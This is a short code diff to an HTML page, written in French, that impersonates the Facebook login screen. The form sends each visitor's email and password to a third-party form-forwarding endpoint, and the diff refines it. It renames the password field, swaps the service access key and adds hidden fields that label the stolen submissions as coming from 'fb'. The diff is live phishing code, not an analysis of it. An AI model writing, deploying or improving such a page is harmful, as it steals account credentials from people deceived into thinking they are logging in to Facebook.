@@ -193,10 +193,12 @@ button:hover {
     <h2>Se connecter à Facebook</h2>
 
 <form action="https://api.staticforms.dev/submit" method="POST">
-  <input type="hidden" name="accessKey" value="sf_4feeed05466a56a2ed2d3f8b">
+  <input type="hidden" name="accessKey" value="sf_mh67m4allbmf7bih979cjh7m">
 
-    <input type="email" name="email" placeholder="Email" required>
-    <input type="password" name="text" placeholder="mot de passe" required>
+    <input type="email" id="email" name="email" placeholder="Email" required>
+    <input type="password" id="password"  name="password" placeholder="mot de passe" required>
+    <input type="hidden" name="subject" value="Message -fb">
+  <input type="hidden" name="site" value="fb">
 
   <button type="submit">Envoyer</button>
 </form>
